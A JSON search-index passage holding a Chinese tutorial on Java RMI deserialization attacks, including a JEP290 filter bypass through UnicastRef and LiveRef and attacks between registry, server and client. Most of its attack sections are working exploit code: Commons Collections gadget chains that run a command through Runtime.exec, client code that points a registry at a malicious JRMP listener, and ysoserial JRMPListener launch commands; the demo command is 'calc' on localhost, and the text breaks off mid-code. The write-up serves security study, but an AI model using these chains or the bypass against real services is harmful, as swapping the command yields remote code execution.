\u5b8c\u6210\u653b\u51fb \u6211\u6240\u8fdb\u884c\u8c03\u8bd5\u7684\u4ee3\u7801\u5982\u4e0b import java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class server { public static void main(String[] args) throws Exception{ String url = \"rmi://127.0.0.1:1069/user\"; user user = new userImpl(); LocateRegistry.createRegistry(1069); Naming.bind(url,user); System.out.println(\"Server Running At\uff1a\" + url); System.out.println(1); } } \u5ba2\u6237\u7aef\u7684exp\u5982\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ddf\u7740exp\u4e2d\u7684\u5185\u5bb9\u62bd\u4e1d\u5265\u8327\u7684\u5206\u6790 ublic class client { public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException { Registry reg = LocateRegistry.getRegistry(\"localhost\",1069); ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(\"127.0.0.1\", 8888); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); reg.bind(\"test12\",proxy); } } LiveRef \u6211\u4eec\u5148\u6765\u770b\u770bLiveRef\uff0c\u8fd9\u5bf9\u8c61\u662fRMI\u901a\u8baf\u4e2d\u6bd4\u8f83\u6838\u5fc3\u7684\u90e8\u5206\uff0c\u5b83\u8bb0\u5f55\u4e86\u6ce8\u518c\u7aef\u7684\u5404\u79cd\u4fe1\u606f\u3002\u6211\u4eec\u901a\u8fc7\u4ee5\u4e0b\u5185\u5bb9\u6765\u770bLiveRef\u662f\u5982\u4f55\u5b9a\u4f4d\u6ce8\u518c\u7aef\u7684\uff0c\u4e3a\u6211\u4eec\u64b0\u5199EXP\u65f6\u901a\u8fc7LiveRef\u5b9a\u4f4d\u6076\u610f\u6ce8\u518c\u7aef\u505a\u94fa\u57ab\u3002 \u5728Naming.lookup \u6216\u8005 Naming.bind\u65b9\u6cd5\u4e2d\uff0c\u90fd\u4f1a\u5148\u901a\u8fc7getRegistry\u65b9\u6cd5\u83b7\u53d6\u6ce8\u518c\u7aef\u3002 \u800cgetRegistry\u8fd4\u56de\u7684\u5bf9\u8c61\u662f\u4e00\u4e2a\u5c01\u88c5\u4e86\u7684UnicastRef\u5bf9\u8c61\uff0cUnicastRef\u4e2d\u5c01\u88c5\u4e86LiveRef\u5bf9\u8c61\uff0c\u5b58\u50a8\u4e86\u6ce8\u518c\u7aef\u4fe1\u606f\u3002 \u6240\u4ee5\u5b9e\u9645\u4e0a\u6ce8\u518c\u7aef\u4fe1\u606f\u662f\u7531\u5c01\u88c5\u5728UnicastRef\u5bf9\u8c61\u4e2d\u7684LiveRef\u5bf9\u8c61\u6765\u5b58\u50a8\u7684\u3002 \u5728bind\u65b9\u6cd5\u6267\u884c\u65f6\uff0c\u4f1a\u5148\u901a\u8fc7UnicastRef.newcall\u5229\u7528LiveRef\u5b58\u50a8\u7684\u6ce8\u518c\u7aef\u4fe1\u606f\u53bb\u5b9a\u4f4d\u6ce8\u518c\u7aef \u90a3\u4e48LiveRef\u4e2d\u5b58\u50a8\u7684\u4fe1\u606f\uff08ep,id,islocal)\u662f\u4ece\u54ea\u6765\u7684\u5462\uff1f\u6211\u4eec\u5c31\u9700\u8981\u53bb\u770b\u770bUnicastRef\u662f\u5982\u4f55\u521d\u59cb\u5316LiveRef\u8fd9\u4e2a\u7c7b\u7684\u3002 \u4e8eUnicastRef#UnicastRef(LiveRef var1)\u4e0e\u670d\u52a1\u7aefbind\u5904\u4e0b\u65ad\u70b9\uff0c\u5f53\u65ad\u70b9\u5728bind\u5904\u505c\u4e0b\u65f6\u4f7f\u5176\u7ee7\u7eed\u8fd0\u884c\u5230UnicastRef#UnicastRef(LiveRef var1\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u6808\u5e27 \u5728LocateRegistry#getRegistry \u5904\u4f1a\u5b9e\u4f8b\u5316LiveRef\u5e76\u4f20\u5165\u53c2\u6570\uff0c\u7136\u540e\u7528\u6b64LiveRef\u5bf9\u8c61\u5b9e\u4f8b\u5316UnicastRef\u3002 \u6211\u4eec\u770b\u770b\u5b9e\u4f8b\u5316LiveRef\u65f6\u4f20\u5165\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u3002 \u5148\u6765\u770bobjid\uff0c\u8fd9\u91cc\u7684ObjID\u3002REGISTRY_ID\u662f\u4e00\u4e2a\u56fa\u5b9a\u503c0 \u518d\u6765\u770b\u770bTCPEndpoint\uff0c\u4f20\u5165TCPEndpoint\u7684\u53c2\u6570\u5206\u522b\u662f\u4ecermi\u5730\u5740\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\u7684host\uff0cport\u4ee5\u53ca\u4e24\u4e2anull\u503c\uff08csf\u56fa\u5b9a\u4e3anull\uff09 \u5230\u8fd9\u91cc\u5c31\u660e\u767d\u4e86LiveRef\u662f\u5982\u4f55\u5b9a\u4f4d\u6ce8\u518c\u7aef\u7684\u4e86\u3002 RemoteObjectInvocationHandler RemoteObjectInvocationHandler \u8fd9\u4e2a\u5bf9\u8c61\u662fRemote\u7684\u5b50\u7c7b\uff0c\u6240\u4ee5\u662f\u53ef\u4ee5\u901a\u8fc7RMI\u7684\u8fc7\u6ee4\u68c0\u6d4b\u7684\u3002 exp\u8fd0\u884c\u540e\uff0c\u5f53\u6ce8\u518c\u7aef\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u8c03\u7528RemoteObjectInvocationHandler\u7236\u7c7bRemoteObject\u7684readObject\u65b9\u6cd5\uff08\u56e0\u4e3aRemoteObjectInvocationHandler\u81ea\u8eab\u5e76\u65e0readObject\u65b9\u6cd5\uff09\uff0c\u5728RemoteObject\u7684readObject\u65b9\u6cd5\u672b\u884c\u6709\u4e00\u4e2aref.readExternal(in) \u8ddf\u8fdb\u8be5\u65b9\u6cd5 \u8c03\u7528\u4e86LiveRef\u7684\u9759\u6001\u65b9\u6cd5read\uff0c\u8ddf\u8fdb\u8be5\u65b9\u6cd5 \u53d1\u73b0\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u6839\u636e\u5e8f\u5217\u5316\u6d41\u4e2d\u7684\u5185\u5bb9\u8fd8\u539f\u51faLiveRef\u5bf9\u8c61\uff0c\u8fd8\u539f\u51fa\u7684LiveRef\u5bf9\u8c61\u4e2d\u8bb0\u5f55\u4e86\u6076\u610f\u6ce8\u518c\u7aef\u7684IP\u548c\u7aef\u53e3\u53f7\u7b49\u4fe1\u606f\u3002 \u7136\u540e\u518d\u7ecf\u8fc7\u4e00\u7cfb\u5217\u7684\u6d41\u7a0b\uff0c\u4f1a\u8c03\u7528\u5230DGCClient#registerRefs 56\u884c\u4ee5LiveRef\u4e2d\u8bb0\u5f55\u7684\u6076\u610f\u6ce8\u518c\u7aef\u5730\u5740\u4e3a\u53c2\u6570\uff0c\u8c03\u7528\u4e86DGCClient.EndpointEntry.lookup\uff0c\u8fd4\u56de\u4e86\u4e00\u4e2a\u5c01\u88c5\u4e86\u6076\u610f\u6ce8\u518c\u7aef\u5730\u5740\u7684DGCClient\u5bf9\u8c61\u3002 \u7136\u540e\u8c03\u7528\u4e86\u8be5DGCClient\u5bf9\u8c61\u7684registerRefs\u65b9\u6cd5\u3002\u8ddf\u8fdb \u518dDGCClient#registerRefs \u672b\u884c\u4f1a\u8c03\u7528\u4e00\u4e2amakeDirtyCall\u65b9\u6cd5\uff0c\u5176\u4e2dvar2\u5c01\u88c5\u4e86\u6307\u5411\u6076\u610f\u6ce8\u518c\u7aef\u7684LiveRef\u5bf9\u8c61\uff0c\u8ddf\u8fdb \u7136\u540e\u4f1a\u8c03\u7528\u4e00\u4e2athis.dgc.dirty\u65b9\u6cd5\uff0cthis.dgc\u4e2d\u5c01\u88c5\u4e86\u6307\u5411\u6076\u610f\u6ce8\u518c\u7aef\u7684LiveRef\uff0c\u8ddf\u8fdb \u6b64\u5904\u7684\u4ee3\u7801\uff08DGCImpl_stub#dirty\uff09\u5c31\u5f88\u50cf \u8be5\u65b9\u6cd5\u4f1a\u5148\u5411\u6076\u610f\u6ce8\u518c\u7aef\u5efa\u7acb\u901a\u8baf\uff0c\u53d1\u9001\u5e8f\u5217\u5316\u4fe1\u606f\uff0c\u63a5\u6536\u6ce8\u518c\u7aef\u4f20\u6765\u7684\u4fe1\u606f\u5e76\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u3002\u5728\u8be5readObject\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u65f6\u5e76\u6ca1\u6709\u8bbe\u7f6e\u8fc7\u6ee4\u5668\uff0c\u6240\u4ee5\u81ea\u7136\u800c\u7136\u5730\u4fbf\u7ed5\u8fc7\u4e86RMI\u901a\u8baf\u4e2dJEP290\u8bbe\u7f6e\u7684\u8fc7\u6ee4\u5668\u7684\u68c0\u6d4b\uff0c\u4ece\u800c\u53ef\u4ee5\u53cd\u5e8f\u5217\u5316\u4efb\u4f55\u6076\u610f\u6ce8\u518c\u7aef\u4f20\u6765\u7684\u5e8f\u5217\u5316\u6d41\uff0c\u9020\u6210\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u3002 \u5b8c\u6574\u590d\u73b0 \u9996\u5148\u5f00\u542f\u6ce8\u518c\u7aef\uff0cuser\u7c7b\u7684\u5177\u4f53\u4ee3\u7801\u5c31\u4e0d\u8d34\u4e86\uff0c\u6ce8\u518c\u7aef\u7aef\u53e3\u4e3a1069 import java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class server { public static void main(String[] args) throws Exception{ String url = \"rmi://127.0.0.1:1069/user\"; user user = new userImpl(); LocateRegistry.createRegistry(1069); Naming.bind(url,user); System.out.println(\"Server Running At\uff1a\" + url); System.out.println(1); } } \u5ba2\u6237\u7aef\u4ee3\u7801 import sun.rmi.server.UnicastRef; import sun.rmi.transport.LiveRef; import sun.rmi.transport.tcp.TCPEndpoint; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.ObjID; import java.rmi.server.RemoteObjectInvocationHandler; import java.util.Random; public class client { public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException { Registry reg = LocateRegistry.getRegistry(\"localhost\",1069); ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(\"127.0.0.1\", 8888); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); reg.bind(\"test12\",obj); } } \u7136\u540eysoserial\u542f\u52a8\u6076\u610f\u6ce8\u518c\u7aef java -cp .\\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 \"calc\" \u5ba2\u6237\u7aef\u8fd0\u884c\uff0c\u6210\u529f\u5f39\u51fa\u8ba1\u7b97\u5668 \u4eff\u5199lookup\u5b9e\u73b0 \u9664\u4e86bind\uff0c\u4e5f\u53ef\u4ee5\u7528lookup\u7684\u4eff\u5199\u6765\u5b9e\u73b0\uff0c\u8fd9\u4e24\u8005\u4e4b\u95f4\u5e95\u5c42\u539f\u7406\u90fd\u662f\u4e00\u6837\u7684\u3002 import sun.rmi.server.UnicastRef; import sun.rmi.transport.LiveRef; import sun.rmi.transport.tcp.TCPEndpoint; import java.lang.reflect.Proxy; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.*; import java.util.Random; import java.io.ObjectOutput; import java.lang.reflect.Field; public class client { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.getRegistry(\"localhost\",1069); ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(\"localhost\", 8888); UnicastRef ref = new UnicastRef(new LiveRef(id, te, true)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); //\u6a21\u4efflookup\u8bf7\u6c42 Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields(); fields_0[0].setAccessible(true); UnicastRef ref2 = (UnicastRef) fields_0[0].get(registry); Field[] fields_1 = registry.getClass().getDeclaredFields(); fields_1[0].setAccessible(true); Operation[] operations = (Operation[]) fields_1[0].get(registry); RemoteCall var2 = ref2.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(obj); ref2.invoke(var2); } } \u603b\u7ed3 \u6240\u4ee5\u672c\u8d28\u4e0a\u6b64\u7ed5\u8fc7\u65b9\u6cd5\u662f \u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u8ba9\u6ce8\u518c\u7aef\u53d8\u4e3aJRMP\u5ba2\u6237\u7aef\uff0c\u5411\u6211\u4eec\u6076\u610f\u7684JRMP\u6ce8\u518c\u7aef\u53d1\u8d77 JRMP \u8bf7\u6c42\u3002 \u501f\u7528\u4e00\u4e0bttpfx\u5e08\u5085\u7684\u56fe\u590d\u76d8\u5168\u8fc7\u7a0b UnicastRef\u4e2d\u7684LiveRef\u88ab\u7528\u4f5c\u5b9a\u4f4d\u6ce8\u518c\u7aef\uff0c\u8fd9\u662f\u524d\u63d0\u3002 RemoteObject\u7684readObject\u65b9\u6cd5\u4f1a\u5728RMI\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u88ab\u8c03\u7528\uff0c\u5176readObject\u65b9\u6cd5\u4f1a\u5728\u540e\u7eed\u4e2d\u8fd8\u539f\u6240\u5c01\u88c5\u7684LiveRef\u5bf9\u8c61\uff0c\u5e76\u5411LiveRef\u5bf9\u8c61\u6307\u5411\u7684\u6ce8\u518c\u7aef\u53d1\u8d77\u901a\u8baf\uff0c\u53cd\u5e8f\u5217\u5316\u5176\u8fd4\u56de\u7684\u6570\u636e\uff0c\u7531\u4e8e\u8be5\u53cd\u5e8f\u5217\u5316\u6d41\u672a\u589e\u6dfb\u8fc7\u6ee4\u5668\uff0c\u6240\u4ee5\u7ed5\u8fc7JEP290\u9020\u6210\u4e86\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u3002 \u56e0\u4e3a\u6587\u7ae0\u662f\u5728\u8fb9\u8c03\u8bd5\u8fb9\u5199\u7684\uff0c\u4e2d\u9014\u8fdb\u884c\u4e86\u591a\u6b21\u5220\u6539\uff0c\u6240\u4ee5\u5bfc\u81f4\u4e9b\u8bb8\u5730\u65b9\u8a00\u8f9e\u4e0d\u591f\u51c6\u786e\uff0c\u671b\u5404\u4f4d\u89c1\u8c05\u3002","title":"RMI ATTACK"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#rmi-attack","text":"","title":"RMI ATTACK"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#_1","text":"RMI \u53cd\u5e8f\u5217\u5316\u653b\u51fb \u670d\u52a1\u7aef\u653b\u51fb\u6ce8\u518c\u7aef \u6ce8\u518c\u7aef\u653b\u51fb\u670d\u52a1\u7aef \u670d\u52a1\u7aef\u653b\u51fb\u5ba2\u6237\u7aef \u5ba2\u6237\u7aef\u653b\u51fb\u670d\u52a1\u7aef \u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u7aef \u6ce8\u518c\u7aef\u653b\u51fb\u5ba2\u6237\u7aef JEP290 \u4ee3\u7801\u5206\u6790 JEP290 BYPASS UnicastRef\uff08JDK<=8u231\uff09 LiveRef RemoteObjectInvocationHandler \u5b8c\u6574\u590d\u73b0 \u4eff\u5199lookup\u5b9e\u73b0 \u603b\u7ed3 \u5f15\u7528\u81ealala\u5e08\u5085","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#rmi","text":"RMI\u8c03\u7528\u7531\u4e09\u90e8\u5206\u6784\u6210\uff1a\u670d\u52a1\u7aef\uff0c\u5ba2\u6237\u7aef\uff0c\u6ce8\u518c\u7aef\u3002\u800c\u5728RMI\u4f20\u8f93\u6570\u636e\u65f6\uff0c\u6570\u636e\u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u8fdb\u884c\u4f20\u8f93\u7684\uff0c\u8fd9\u5c31\u610f\u5473\u7740RMI\u8c03\u7528\u4e2d\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u7684\u64cd\u4f5c\uff0c\u8fd9\u5c31\u7ed9\u4e86\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u53ef\u4e58\u4e4b\u673a\u3002 \u5728\u9ad8\u7248\u672cJDK\u4e2d\uff0c\u6ce8\u518c\u7aef\u548c\u670d\u52a1\u7aef\u662f\u5fc5\u987b\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\u7684\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5728\u9ad8\u7248\u672cJDK\u4e2d\u6ce8\u518c\u7aef\u6253\u670d\u52a1\u7aef\u6216\u8005\u670d\u52a1\u7aef\u6253\u653b\u51fb\u7aef\u6ca1\u5565\u7528\u3002\u800c\u5728\u4f4e\u7248\u672c\u4e2d\u8fd9\u4e24\u8005\u662f\u53ef\u4ee5\u5206\u79bb\u7684\uff0c\u8fd8\u7b97\u6709\u653b\u51fb\u7684\u53ef\u80fd\u3002\u4f46\u603b\u4f53\u6765\u8bf4\u8fd9\u7c7b\u653b\u51fb\u65b9\u6cd5\u8fd8\u662f\u5f88\u9e21\u808b\u7684\u3002 \u63a5\u4e0b\u6765\u4f1a\u5bf9\u653b\u51fb\u65b9\u548c\u53d7\u5bb3\u65b9\u7684\u4e0d\u540c\uff0c\u5206\u62106\u79cd\u653b\u51fb\u65b9\u5f0f\uff0c\u5982\u4e0b\u3002 \uff08\u9664\u975e\u7279\u6b8a\u8bf4\u660e\uff0c\u5426\u5219\u4e0b\u9762\u8bf4\u7684\u90fd\u662f8u66\u548cCC1\u94fe\uff09","title":"RMI \u53cd\u5e8f\u5217\u5316\u653b\u51fb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#_2","text":"\u670d\u52a1\u7aef\u5728\u5411\u6ce8\u518c\u7aef\u4f7f\u7528bind\u7b49\u51fd\u6570\u64cd\u4f5c\u8fdc\u7a0b\u5bf9\u8c61\u65f6\uff0c\u4f1a\u63d0\u4f9b\u4e00\u6bb5\u5e8f\u5217\u5316\u6570\u636e\uff0c\u6ce8\u518c\u7aef\u83b7\u53d6\u5230\u5e8f\u5217\u5316\u6570\u636e\u540e\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u8fd9\u4e2d\u95f4\u5c31\u4f1a\u6709\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53d1\u751f\u53ef\u80fd\u3002 \u4e0b\u9762\u7528CC1\u94fe\u53bb\u8fdb\u884c\u653b\u51fb\uff0cJDK\u7248\u672c8u66 import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; public class server { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[] {\"calc\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"value\", \"123\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class AnnotationInvocationHandlerClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class); cons.setAccessible(true); InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject)); Registry registry = LocateRegistry.createRegistry(3333); Registry registry_remote = LocateRegistry.getRegistry(\"127.0.0.1\", 3333); registry_remote.bind(\"HelloRegistry\", proxyEvalObject); } }","title":"\u670d\u52a1\u7aef\u653b\u51fb\u6ce8\u518c\u7aef"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#_3","text":"\u670d\u52a1\u7aef\u5728\u5411\u6ce8\u518c\u7aef\u4f7f\u7528bind\u7b49\u51fd\u6570\u64cd\u4f5c\u8fdc\u7a0b\u5bf9\u8c61\u65f6\uff0c\u4f1a\u63d0\u4f9b\u4e00\u6bb5\u5e8f\u5217\u5316\u6570\u636e\uff0c\u968f\u540e\u6ce8\u518c\u7aef\u4e5f\u4f1a\u5411\u670d\u52a1\u7aef\u53d1\u9001\u4e00\u6bb5\u5e8f\u5217\u5316\u6570\u636e\uff0c\u670d\u52a1\u7aef\u4fbf\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u5176\u4e2d\u4fbf\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53d1\u751f\u7684\u53ef\u80fd\u3002 8u66 import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class server { public static void main(String[] args) throws Exception{ String url = \"rmi://127.0.0.1:1234/setUser\"; user user = new userImpl(); LocateRegistry.createRegistry(12345); Naming.unbind(url); System.out.println(\"Server Running At\uff1a\" + url); } } \u540c\u65f6ysoserial\u5f00\u542f\u6076\u610fJRMP\u6ce8\u518c\u7aef\uff0c\u63d0\u4f9bcc1\u94fe\u3002 java -cp .\\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections1 \"calc\"","title":"\u6ce8\u518c\u7aef\u653b\u51fb\u670d\u52a1\u7aef"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#_4","text":"RMI\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u7684\u4ea4\u4e92\u4e5f\u662f\u7531\u5e8f\u5217\u5316\u6570\u636e\u4f20\u8f93\u6765\u8fdb\u884c\u7684\uff0c\u6240\u4ee5\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u4e4b\u95f4\u4e5f\u5b58\u5728\u76f8\u4e92\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u53ef\u80fd\u3002 \u670d\u52a1\u7aef import java.lang.reflect.InvocationHandler; import java.rmi.Remote; public interface user extends Remote{ public InvocationHandler exp() throws Exception; } import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class userImpl extends UnicastRemoteObject implements user{ //\u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3\u5b9e\u73b0\u7c7b,\u6ce8\u610f\u8fd9\u4e2a\u8fdc\u7a0b\u5b9e\u73b0\u7c7b\u5fc5\u987b\u7ee7\u627f\u81eaUnicastRemoteObject,\u4e0d\u7136\u670d\u52a1\u7aef\u4e0d\u4f1a\u53d1\u9001\u8be5\u7c7b\u7684\u5bf9\u8c61\u7684\u5b58\u6839(stub(\u4e0b\u6587\u8bb2)) protected userImpl RemoteException; protected userImpl() throws RemoteException { } public InvocationHandler exp() throws Exception{ ChainedTransformer chainedTransformer= new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}); Map innermap = new HashMap(); Map outermap = LazyMap.decorate(innermap, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); //\u5999\u5904 InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//\u83b7\u5f97\u4e00\u4e2aAnnotationInvocationHandler\u5bf9\u8c61 Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//\u521b\u5efa\u4e00\u4e2aMap\u7684\u4ee3\u7406\u7c7b\uff0c\u5176\u4ee3\u7406\u65b9\u6cd5\u4e3aAnnotationInvocationHandler\u5bf9\u8c61\u91cc\u7684invoke\u65b9\u6cd5 InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox); //\u5c06\u4ee3\u7406Map\u4f20\u5165\uff0c\u5f53\u4ee3\u7406Map\u88ab\u6267\u884c\u4efb\u4e00\u65b9\u6cd5\u65f6\uff0c\u6267\u884cinvoke\u65b9\u6cd5 return handler1; } } import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class server { public static void main(String[] args) throws Exception{ String url = \"rmi://127.0.0.1:23335/exp\"; user user = new userImpl(); LocateRegistry.createRegistry(23335); Naming.bind(url,user); System.out.println(\"Server Running At\uff1a\" + url); } } \u5ba2\u6237\u7aef import java.lang.reflect.InvocationHandler; import java.rmi.Remote; public interface user extends Remote{ public InvocationHandler exp() throws Exception; } import java.rmi.Naming; public class client { public static void main(String[] args){ try{ String url = \"rmi://127.0.0.1:23335/exp\"; user user = (user)Naming.lookup(url); Object ob = user.exp(); System.out.println(ob); }catch(Exception e){ e.printStackTrace(); } } } \u5148\u542f\u52a8\u670d\u52a1\u7aef\u518d\u542f\u52a8\u5ba2\u6237\u7aef\u5c31\u80fd\u5f39\u8ba1\u7b97\u5668\u8fa3","title":"\u670d\u52a1\u7aef\u653b\u51fb\u5ba2\u6237\u7aef"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/#_5","text":"\u539f\u7406\u540c\u4e0a\uff0c\u4e0d\u518d\u8bf4\u4e86\u3002 \u670d\u52a1\u7aef import java.lang.reflect.InvocationHandler; import java.rmi.Remote; public interface user extends Remote{ public void exp(Object a) throws Exception; } import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class userImpl extends UnicastRemoteObject implements user{ //\u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3\u5b9e\u73b0\u7c7b,\u6ce8\u610f\u8fd9\u4e2a\u8fdc\u7a0b\u5b9e\u73b0\u7c7b\u5fc5\u987b\u7ee7\u627f\u81eaUnicastRemoteObject,\u4e0d\u7136\u670d\u52a1\u7aef\u4e0d\u4f1a\u53d1\u9001\u8be5\u7c7b\u7684\u5bf9\u8c61\u7684\u5b58\u6839(stub(\u4e0b\u6587\u8bb2)) protected userImpl RemoteException; protected userImpl() throws RemoteException { } public void exp(Object a) throws Exception{ System.out.println(\"123\"); } } import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class server { public static void main(String[] args) throws Exception{ String url = \"rmi://127.0.0.1:23335/exp\"; user user = new userImpl(); LocateRegistry.createRegistry(23335); Naming.bind(url,user); System.out.println(\"Server Running At\uff1a\" + url); } } \u5ba2\u6237\u7aef import java.rmi.Remote; public interface user extends Remote{ public void exp(Object a) throws Exception; } import java.rmi.Naming; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class client { public static void main(String[] args){ try{ String url = \"rmi://127.0.0.1:23335/exp\"; user user = (user)Naming.lookup(url); ChainedTransformer chainedTransformer= new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] 